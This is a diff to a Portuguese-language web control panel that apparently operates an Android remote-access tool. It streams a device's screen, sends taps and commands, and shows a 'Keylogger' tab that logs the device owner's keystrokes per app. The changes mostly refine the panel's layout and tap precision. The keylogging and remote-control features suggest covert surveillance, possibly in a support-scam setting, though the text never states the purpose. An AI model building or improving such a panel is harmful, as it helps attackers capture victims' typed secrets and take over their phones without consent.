@@ -24,18 +24,21 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
 .ctrl.warn{color:#ed8936}.ctrl.warn i{color:#ed8936}
 .ctrl.warn:hover{background:#2d1f0a;color:#fbd38d}
 .center{display:flex;flex-direction:column;align-items:center;padding:12px 20px;gap:8px;overflow:auto}
-.device{background:#1a202c;border:2px solid #2d3748;border-radius:28px;position:relative;overflow:hidden;flex-shrink:0}
-.screen{width:100%;height:100%;background:#0d1117;display:flex;align-items:center;justify-content:center;cursor:crosshair;position:relative}
-#stream-img{width:100%;height:100%;object-fit:contain;display:none}
-.screen-placeholder{text-align:center;color:#2d3748}
+
+/* Device frame — tamanho automático baseado na resolução real */
+.device{background:#111827;border:3px solid #374151;border-radius:32px;position:relative;overflow:hidden;flex-shrink:0;box-shadow:0 0 0 1px #1f2937,0 20px 60px rgba(0,0,0,0.5)}
+.screen{width:100%;height:100%;background:#000;display:flex;align-items:stretch;justify-content:stretch;cursor:crosshair;position:relative;overflow:hidden}
+#stream-img{width:100%;height:100%;object-fit:fill;display:none;pointer-events:none}
+.screen-placeholder{text-align:center;color:#2d3748;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%)}
 .screen-placeholder i{font-size:36px;display:block;margin-bottom:8px}
 .screen-placeholder p{font-size:11px}
+
 .nav-bar{display:flex;gap:6px;justify-content:center;flex-wrap:wrap}
-.nav-btn{padding:8px 16px;background:#1e2433;border:1px solid #2d3748;border-radius:10px;color:#a0aec0;cursor:pointer;font-size:12px;display:flex;align-items:center;gap:5px;flex-direction:column}
+.nav-btn{padding:8px 14px;background:#1e2433;border:1px solid #2d3748;border-radius:10px;color:#a0aec0;cursor:pointer;font-size:11px;display:flex;align-items:center;gap:4px;flex-direction:column}
 .nav-btn:hover{background:#2d3748;color:#fff}
 .nav-btn.warn{border-color:#ed8936;color:#ed8936}
 .nav-btn.warn:hover{background:#2d1f0a;color:#fbd38d}
-.nav-btn i{font-size:18px}
+.nav-btn i{font-size:16px}
 .nav-btn span{font-size:9px}
 .msg-box{display:flex;gap:6px;width:100%}
 .msg-box input{flex:1;background:#1e2433;border:1px solid #2d3748;border-radius:8px;padding:8px 12px;color:#e2e8f0;font-size:13px;outline:none}
@@ -44,7 +47,7 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
 .msg-box button{padding:8px 14px;background:#4299e1;border:none;border-radius:8px;color:#fff;cursor:pointer;font-size:12px;white-space:nowrap;display:flex;align-items:center;gap:4px}
 .msg-box button:hover{background:#3182ce}
 .right{border-left:1px solid #2d3748;background:#161b27;padding:12px;display:flex;flex-direction:column;overflow:hidden}
-.stat-row{display:flex;justify-content:space-between;align-items:center;padding:6px 0;border-bottom:1px solid #1e2433;font-size:11px}
+.stat-row{display:flex;justify-content:space-between;align-items:center;padding:5px 0;border-bottom:1px solid #1e2433;font-size:11px}
 .stat-label{color:#4a5568}.stat-val{color:#e2e8f0;font-weight:500}
 .tabs{display:flex;gap:4px;margin-top:8px;margin-bottom:4px}
 .tab{padding:4px 10px;border-radius:6px;border:1px solid #2d3748;background:transparent;color:#718096;cursor:pointer;font-size:10px}
@@ -67,7 +70,7 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
 .sem-clientes{color:#4a5568;font-size:13px;text-align:center}
 .sem-clientes i{font-size:32px;display:block;margin-bottom:8px}
 #tela-painel{display:none;flex:1;overflow:hidden}
-.tela-painel-inner{display:grid;grid-template-columns:200px 1fr 220px;height:100%}
+.tela-painel-inner{display:grid;grid-template-columns:200px 1fr 240px;height:100%}
 </style>
 </head>
 <body>
@@ -117,6 +120,7 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
       </div>
 
       <div class="center">
+        <!-- Visor maior e com cliques precisos -->
         <div class="device" id="device-wrap">
           <div class="screen" id="screen" onclick="handleToque(event)">
             <img id="stream-img" alt="Tela do dispositivo">
@@ -151,13 +155,10 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
         <div class="stat-row"><span class="stat-label">Android</span><span class="stat-val" id="d-os">—</span></div>
         <div class="stat-row"><span class="stat-label">Modelo</span><span class="stat-val" id="d-model">—</span></div>
         <div class="stat-row"><span class="stat-label">Resolução</span><span class="stat-val" id="d-res">—</span></div>
-
-        <!-- Abas Log / Keylogger -->
         <div class="tabs">
           <button class="tab active" id="tab-log" onclick="mudarAba('log')">📋 Log</button>
           <button class="tab" id="tab-key" onclick="mudarAba('key')">⌨️ Keylogger <span id="key-badge" style="display:none;background:#fc8181;color:#fff;border-radius:999px;padding:0 5px;font-size:9px;margin-left:2px">!</span></button>
         </div>
-
         <div class="log" id="painel-log"></div>
         <div class="log" id="painel-key" style="display:none"></div>
       </div>
@@ -170,6 +171,9 @@ const SERVER = window.location.origin.replace(/^http/, 'ws');
 let ws = null, deviceAtual = null, streaming = false;
 let dispositivoLargura = 0, dispositivoAltura = 0;
 let abaAtual = 'log';
+
+// Tamanho do visor — calculado automaticamente pela proporção do celular
+const VISOR_W = 260; // largura base do visor em pixels
 
 function mudarAba(aba){
   abaAtual = aba;
@@ -194,7 +198,6 @@ function logKey(texto, app){
   d.className = 'keylog-entry';
   d.innerHTML = `<span class="app">${new Date().toLocaleTimeString('pt-BR')} — ${app}</span>${texto}`;
   el.prepend(d);
-  // Mostra badge se não está na aba
   if(abaAtual !== 'key') document.getElementById('key-badge').style.display = 'inline';
 }
 
@@ -229,9 +232,7 @@ function conectarTecnico(){
         log('Stream ativo', 'ev');
         break;
       case 'frame_tela': mostrarFrame(msg.frame); break;
-      case 'keylog':
-        logKey(msg.texto, msg.app || 'desconhecido');
-        break;
+      case 'keylog': logKey(msg.texto, msg.app || 'desconhecido'); break;
       case 'cliente_desconectou': log('Cliente desconectou', 'err'); break;
     }
   };
@@ -258,9 +259,7 @@ function renderizarClientes(clientes){
   `).join('');
 }
 
-function atenderCliente(deviceToken){
-  ws.send(JSON.stringify({ tipo: 'conectar_cliente', deviceToken }));
-}
+function atenderCliente(token){ ws.send(JSON.stringify({ tipo:'conectar_cliente', deviceToken:token })); }
 
 function abrirPainel(){
   document.getElementById('tela-clientes').style.display = 'none';
@@ -292,23 +291,29 @@ function send(msg){
 }
 
 function sendCmd(cmd){ send({ tipo:'cmd', cmd }); log(`→ cmd ${cmd}`); }
-
-function solicitarCompartilhamento(){
-  send({ tipo: 'cmd', cmd: 'solicitar_tela' });
-  log('→ Solicitando compartilhamento de tela...', 'warn');
-}
+function solicitarCompartilhamento(){ send({ tipo:'cmd', cmd:'solicitar_tela' }); log('→ Pedindo tela...','warn'); }
 
 function handleToque(e){
-  const rect = e.currentTarget.getBoundingClientRect();
-  const xPct = ((e.clientX - rect.left) / rect.width * 100).toFixed(2);
-  const yPct = ((e.clientY - rect.top)  / rect.height * 100).toFixed(2);
+  const screen = document.getElementById('screen');
+  const img = document.getElementById('stream-img');
+  const rect = screen.getBoundingClientRect();
+
+  // Clique em relação ao container
+  const clickX = e.clientX - rect.left;
+  const clickY = e.clientY - rect.top;
+
+  // Como a imagem usa object-fit:fill, ocupa 100% do container
+  // Então o clique é direto em proporção
+  const xPct = (clickX / rect.width * 100).toFixed(4);
+  const yPct = (clickY / rect.height * 100).toFixed(4);
+
   send({ tipo:'toque', x:+xPct, y:+yPct, largura: dispositivoLargura||1080, altura: dispositivoAltura||2340 });
 }
 
 function enviarMensagem(){
   const v = document.getElementById('msg-input').value.trim();
   if(!v) return;
-  send({ tipo:'mensagem', texto: v });
+  send({ tipo:'mensagem', texto:v });
   log(`→ mensagem: ${v}`, 'ev');
   document.getElementById('msg-input').value = '';
 }
@@ -338,10 +343,14 @@ function atualizarDispositivo(info){
     dispositivoLargura = parseInt(info.largura);
     dispositivoAltura  = parseInt(info.altura);
     document.getElementById('d-res').textContent = `${dispositivoLargura}×${dispositivoAltura}`;
+
+    // Calcula tamanho do visor respeitando a proporção real do celular
     const ratio = dispositivoAltura / dispositivoLargura;
+    const w = VISOR_W;
+    const h = Math.round(w * ratio);
     const wrap = document.getElementById('device-wrap');
-    wrap.style.width = '210px';
-    wrap.style.height = Math.round(210 * ratio) + 'px';
+    wrap.style.width = w + 'px';
+    wrap.style.height = h + 'px';
   }
 }
 
